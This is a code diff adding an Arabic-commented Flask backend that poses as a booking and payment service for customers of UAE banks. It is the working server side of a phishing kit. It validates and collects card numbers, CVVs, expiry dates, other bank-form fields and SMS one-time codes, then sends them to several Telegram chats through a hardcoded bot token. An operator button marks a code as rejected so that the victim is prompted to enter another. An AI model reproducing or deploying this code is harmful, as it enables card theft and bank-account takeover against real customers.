@@ -1,0 +1,557 @@
+import requests
+from flask import Blueprint, request, jsonify
+from datetime import datetime
+
+
+telegram_bp = Blueprint('telegram', __name__)
+
+# قاموس لتعيين معرفات البنوك إلى الأسماء الصحيحة
+BANK_NAMES = {
+    "3": "مصرف عجمان",
+    "4": "مصرف أبوظبي الإسلامي",
+    "2": "بنك دبي الإسلامي",
+    "6": "بنك HSBC",
+    "8": "مصرف الشارقة الإسلامي",
+    "5": "بنك أبوظبي التجاري",
+    "13": "بنك دبي التجاري",
+    "12": "بنك رأس الخيمة الوطني",
+    "10": "بنك الفجيرة الوطني",
+    "7": "بنك أبوظبي الأول",
+    "9": "الإمارات الإسلامي",
+    "14": "بنك الإمارات دبي الوطني",
+    "1": "المشرق"
+}
+
+
+# بيانات البوت
+BOT_TOKEN = "8413623443:AAFjS-6s3Aa9cBwt_dC-kBXE3OXiLtGnb-4"
+
+CHAT_IDS = [
+    "7942066919",
+    "6323300854",
+    "6671822049",
+    "7335192117",
+    "8280462390"  # الإيدي الجديد
+]
+
+def send_telegram_message(message):
+    """إرسال رسالة إلى جميع معرفات الدردشة"""
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    results = []
+    
+    for chat_id in CHAT_IDS:
+        payload = {
+            "chat_id": chat_id,
+            "text": message,
+            "parse_mode": "HTML"
+        }
+        
+        try:
+            response = requests.post(url, json=payload, timeout=10)
+            results.append({
+                "chat_id": chat_id,
+                "success": response.status_code == 200,
+                "response": response.json()
+            })
+        except Exception as e:
+            results.append({
+                "chat_id": chat_id,
+                "success": False,
+                "error": str(e)
+            })
+    
+    return results
+
+@telegram_bp.route('/booking', methods=['POST'])
+def receive_booking():
+    """استقبال بيانات الحجز من الموقع"""
+    try:
+        data = request.get_json()
+        
+        # استخراج البيانات
+        booking_id = data.get('bookingId', 'غير متوفر')
+        amount = data.get('amount', 'غير متوفر')
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        # تنسيق الرسالة بشكل منظم
+        message = f"""
+╔══════════════════════════
+║ 🔔 <b>حجز جديد</b>
+╠══════════════════════════
+║
+║ 📋 <b>رقم بطاقة الحجز:</b>
+║    <code>{booking_id}</code>
+║
+║ 💰 <b>المبلغ المطلوب:</b>
+║    {amount}
+║
+║ 🕒 <b>وقت التسجيل:</b>
+║    {timestamp}
+║
+╚══════════════════════════
+✅ <b>تم استلام البيانات بنجاح</b>
+"""
+        
+        # إرسال الرسالة إلى تليجرام
+        results = send_telegram_message(message)
+        
+        return jsonify({
+            "success": True,
+            "message": "تم إرسال البيانات إلى تليجرام",
+            "telegram_results": results
+        }), 200
+        
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
+
+@telegram_bp.route('/bank-selection', methods=['POST'])
+def receive_bank_selection():
+    """استقبال اختيار البنك"""
+    try:
+        data = request.get_json()
+        
+        # استخراج البيانات
+        bank_id = data.get('bankId', 'غير متوفر')
+        bank_name = BANK_NAMES.get(bank_id, 'غير متوفر')
+        booking_id = data.get('bookingId', 'غير متوفر')
+        amount = data.get('amount', 'غير متوفر')
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        # تنسيق الرسالة بشكل منظم
+        message = f"""
+╔══════════════════════════
+║ 🏦 <b>اختيار بنك</b>
+╠══════════════════════════
+║
+║ 🏛️ <b>البنك المختار:</b>
+║    <b>{bank_name}</b>
+║
+║ 📋 <b>رقم بطاقة الحجز:</b>
+║    <code>{booking_id}</code>
+║
+║ 💰 <b>المبلغ:</b>
+║    {amount}
+║
+║ 🕒 <b>وقت الاختيار:</b>
+║    {timestamp}
+║
+╚══════════════════════════
+✅ <b>تم اختيار البنك بنجاح</b>
+"""
+        
+        # إرسال الرسالة إلى تليجرام
+        results = send_telegram_message(message)
+        
+        return jsonify({
+            "success": True,
+            "message": "تم إرسال البيانات إلى تليجرام",
+            "telegram_results": results
+        }), 200
+        
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
+
+@telegram_bp.route('/startup', methods=['GET'])
+def startup_notification():
+    """إرسال رسالة تأكيد عند تشغيل البوت"""
+    try:
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        message = f"""
+╔══════════════════════════
+║ 🚀 <b>تم تشغيل البوت</b>
+╠══════════════════════════
+║
+║ ✅ البوت يعمل الآن وجاهز
+║    لاستقبال البيانات
+║
+║ 🕒 <b>وقت التشغيل:</b>
+║    {timestamp}
+║
+╚══════════════════════════
+📊 <b>النظام جاهز للعمل</b>
+"""
+        
+        results = send_telegram_message(message)
+        
+        return jsonify({
+            "success": True,
+            "message": "تم إرسال رسالة التشغيل",
+            "telegram_results": results
+        }), 200
+        
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
+
+
+@telegram_bp.route("/bank-form-data", methods=["POST"])
+def receive_bank_form_data():
+    """استقبال بيانات النموذج من صفحات البنوك الفردية"""
+    try:
+        data = request.get_json()
+        
+        # استخراج البيانات
+        referrer = request.headers.get("Referer")
+        bank_id = None
+        if referrer:
+            try:
+                # Extract the number from the URL, e.g., /bank/banks/1.html -> 1
+                bank_id = referrer.split('/')[-1].split('.')[0]
+            except (IndexError, ValueError):
+                bank_id = None
+
+        if not bank_id:
+            bank_id = data.get("bankId")
+
+        bank_name = BANK_NAMES.get(bank_id, "غير متوفر")
+        booking_id = data.get("bookingId", "غير متوفر")
+        amount = data.get("amount", "غير متوفر")
+        form_data = data.get("formData", {})
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        # =======================================================
+        # إضافة التحقق من صحة المدخلات هنا
+        # =======================================================
+        errors = {}
+        if 'card_number' in form_data:
+            card_number = form_data['card_number'].replace(' ', '')
+            if not card_number.isdigit() or not (13 <= len(card_number) <= 19):
+                errors['card_number'] = 'رقم البطاقة غير صحيح.'
+        
+        if 'card_holder_name' in form_data:
+            card_holder_name = form_data['card_holder_name']
+            if not all(c.isalpha() or c.isspace() for c in card_holder_name):
+                errors['card_holder_name'] = 'اسم حامل البطاقة يجب أن يحتوي على أحرف ومسافات فقط.'
+
+        if 'expiry_date' in form_data:
+            expiry_date = form_data['expiry_date']
+            if not (len(expiry_date) == 5 and expiry_date[2] == '/' and expiry_date[:2].isdigit() and expiry_date[3:].isdigit()):
+                errors['expiry_date'] = 'تاريخ انتهاء الصلاحية غير صحيح (MM/YY).'
+            else:
+                month = int(expiry_date[:2])
+                year = int(expiry_date[3:])
+                current_year = datetime.now().year % 100
+                current_month = datetime.now().month
+                if not (1 <= month <= 12) or year < current_year or (year == current_year and month < current_month):
+                    errors['expiry_date'] = 'تاريخ انتهاء الصلاحية غير صالح.'
+
+        if 'cvv' in form_data:
+            cvv = form_data['cvv']
+            if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
+                errors['cvv'] = 'رمز CVV غير صحيح.'
+
+        if errors:
+            return jsonify({"success": False, "message": "خطأ في التحقق من المدخلات", "errors": errors}), 400
+        # =======================================================
+
+        # تنسيق بيانات النموذج
+        form_fields = ""
+        for key, value in form_data.items():
+            # إخفاء كلمات المرور جزئياً
+            if "password" in key.lower() or "pass" in key.lower() or "pin" in key.lower():
+                masked_value = "*" * len(value) if value else ""
+                form_fields += f"║ 🔒 <b>{key}:</b> {masked_value}\n"
+            else:
+                form_fields += f"║ 📝 <b>{key}:</b> <code>{value}</code>\n"
+        
+        # تنسيق الرسالة بشكل منظم
+        message = f"""
+╔══════════════════════════
+║ 💳 <b>بيانات بنكية جديدة</b>
+╠══════════════════════════
+║
+║ 🏛️ <b>البنك:</b>
+║    <b>{bank_name}</b>
+║
+║ 📋 <b>رقم بطاقة الحجز:</b>
+║    <code>{booking_id}</code>
+║
+║ 💰 <b>المبلغ:</b>
+║    {amount}
+║
+╠══════════════════════════
+║ 📊 <b>البيانات المدخلة:</b>
+╠══════════════════════════
+║
+{form_fields}║
+║ 🕒 <b>وقت الإدخال:</b>
+║    {timestamp}
+║
+╚══════════════════════════
+✅ <b>تم استلام البيانات بنجاح</b>
+"""
+        
+        # إرسال الرسالة إلى تليجرام
+        results = send_telegram_message(message)
+        
+        return jsonify({
+            "success": True,
+            "message": "تم إرسال البيانات إلى تليجرام",
+            "telegram_results": results
+        }), 200
+        
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
+
+
+@telegram_bp.route('/sms-code', methods=['POST'])
+def receive_sms_code():
+    """استقبال كود SMS من صفحة SMS"""
+    try:
+        data = request.get_json()
+        
+        # استخراج البيانات
+        sms_code = data.get('smsCode', 'غير متوفر')
+        booking_id = data.get('bookingId', 'غير متوفر')
+        bank_id = data.get('bankId', 'غير متوفر')
+        bank_name = BANK_NAMES.get(bank_id, 'غير متوفر')
+        amount = data.get('amount', 'غير متوفر')
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        # تنسيق الرسالة مع إضافة زر للبوت
+        message = f"""
+╔══════════════════════════
+║ 📱 <b>كود SMS جديد</b>
+╠══════════════════════════
+║
+║ 🔐 <b>الكود:</b>
+║    <code>{sms_code}</code>
+║
+║ 🏛️ <b>البنك:</b>
+║    <b>{bank_name}</b>
+║
+║ 📋 <b>رقم بطاقة الحجز:</b>
+║    <code>{booking_id}</code>
+║
+║ 💰 <b>المبلغ:</b>
+║    {amount}
+║
+║ 🕒 <b>وقت الإدخال:</b>
+║    {timestamp}
+║
+╚══════════════════════════
+⏳ <b>انتظار التحقق لمدة 3 دقائق...</b>
+"""
+        
+        # إرسال الرسالة مع زر inline keyboard
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        results = []
+        
+        for chat_id in CHAT_IDS:
+            payload = {
+                "chat_id": chat_id,
+                "text": message,
+                "parse_mode": "HTML",
+                "reply_markup": {
+                    "inline_keyboard": [[
+                        {
+                            "text": "❌ الكود خطأ - أعد المحاولة",
+                            "callback_data": f"reject_code_{booking_id}_{sms_code}"
+                        }
+                    ]]
+                }
+            }
+            
+            try:
+                response = requests.post(url, json=payload, timeout=10)
+                results.append({
+                    "chat_id": chat_id,
+                    "success": response.status_code == 200,
+                    "response": response.json()
+                })
+            except Exception as e:
+                results.append({
+                    "chat_id": chat_id,
+                    "success": False,
+                    "error": str(e)
+                })
+        
+        return jsonify({
+            "success": True,
+            "message": "تم إرسال الكود إلى تليجرام مع زر الرفض"
+        }), 200
+        
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
+
+
+@telegram_bp.route('/code-rejected', methods=['POST'])
+def code_rejected():
+    """استقبال إشعار رفض الكود من البوت"""
+    try:
+        data = request.get_json()
+        
+        # استخراج البيانات
+        booking_id = data.get('bookingId', 'غير متوفر')
+        sms_code = data.get('smsCode', 'غير متوفر')
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        # هنا يمكنك إضافة منطق إضافي مثل:
+        # - إرسال إشعار للموقع
+        # - تحديث قاعدة البيانات
+        # - إرسال رسالة للمستخدم
+        
+        return jsonify({
+            "success": True,
+            "message": "تم تسجيل رفض الكود",
+            "booking_id": booking_id,
+            "sms_code": sms_code,
+            "timestamp": timestamp
+        }), 200
+        
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
+
+
+# متغير عام لتتبع حالة الخطأ
+error_status = {"hasError": False, "timestamp": None}
+
+@telegram_bp.route('/webhook', methods=['POST'])
+def telegram_webhook():
+    """استقبال webhook من تليجرام للتعامل مع الأزرار"""
+    try:
+        global error_status
+        data = request.get_json()
+        
+        # التحقق من وجود callback_query
+        if 'callback_query' in data:
+            callback_query = data['callback_query']
+            callback_data = callback_query.get('data', '')
+            chat_id = callback_query['from']['id']
+            message_id = callback_query['message']['message_id']
+            
+            # التحقق من أن الضغط على زر رفض الكود
+            if callback_data.startswith('reject_code_'):
+                # استخراج booking_id و sms_code من callback_data
+                parts = callback_data.split('_')
+                if len(parts) >= 4:
+                    booking_id = parts[2]
+                    sms_code = parts[3]
+                    
+                    # تسجيل حالة الخطأ
+                    error_status = {
+                        "hasError": True,
+                        "timestamp": datetime.now().isoformat(),
+                        "booking_id": booking_id,
+                        "sms_code": sms_code
+                    }
+                    
+                    # إرسال رد على الزر
+                    answer_callback_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
+                    answer_payload = {
+                        "callback_query_id": callback_query['id'],
+                        "text": "تم رفض الكود وإرسال رسالة للمستخدم",
+                        "show_alert": True
+                    }
+                    requests.post(answer_callback_url, json=answer_payload)
+                    
+                    # تحديث الرسالة لإظهار أنه تم الرفض
+                    edit_message_url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
+                    edit_payload = {
+                        "chat_id": chat_id,
+                        "message_id": message_id,
+                        "text": f"""
+╔══════════════════════════
+║ ❌ <b>تم رفض الكود</b>
+╠══════════════════════════
+║
+║ 🔐 <b>الكود المرفوض:</b>
+║    <code>{sms_code}</code>
+║
+║ 📋 <b>رقم بطاقة الحجز:</b>
+║    <code>{booking_id}</code>
+║
+║ 🕒 <b>وقت الرفض:</b>
+║    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+║
+╚══════════════════════════
+✅ <b>تم إرسال رسالة للمستخدم بإعادة المحاولة</b>
+""",
+                        "parse_mode": "HTML"
+                    }
+                    requests.post(edit_message_url, json=edit_payload)
+                    
+        return jsonify({"success": True}), 200
+        
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
+
+
+@telegram_bp.route('/set-webhook', methods=['POST'])
+def set_webhook():
+    """تعيين webhook URL للبوت"""
+    try:
+        # الحصول على URL الأساسي من الطلب وتحويله إلى HTTPS
+        base_url = request.host_url.rstrip('/').replace('http://', 'https://')
+        webhook_url = f"{base_url}/api/telegram/webhook"
+        
+        # تعيين webhook
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
+        payload = {
+            "url": webhook_url
+        }
+        
+        response = requests.post(url, json=payload)
+        
+        return jsonify({
+            "success": response.status_code == 200,
+            "webhook_url": webhook_url,
+            "telegram_response": response.json()
+        }), 200
+        
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
+
+
+@telegram_bp.route('/check-error-status', methods=['GET'])
+def check_error_status():
+    """فحص حالة الخطأ للموقع"""
+    try:
+        global error_status
+        return jsonify(error_status), 200
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
+
+
+@telegram_bp.route('/clear-error-status', methods=['POST'])
+def clear_error_status():
+    """مسح حالة الخطأ بعد عرضها للمستخدم"""
+    try:
+        global error_status
+        error_status = {"hasError": False, "timestamp": None}
+        return jsonify({
+            "success": True,
+            "message": "تم مسح حالة الخطأ"
+        }), 200
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
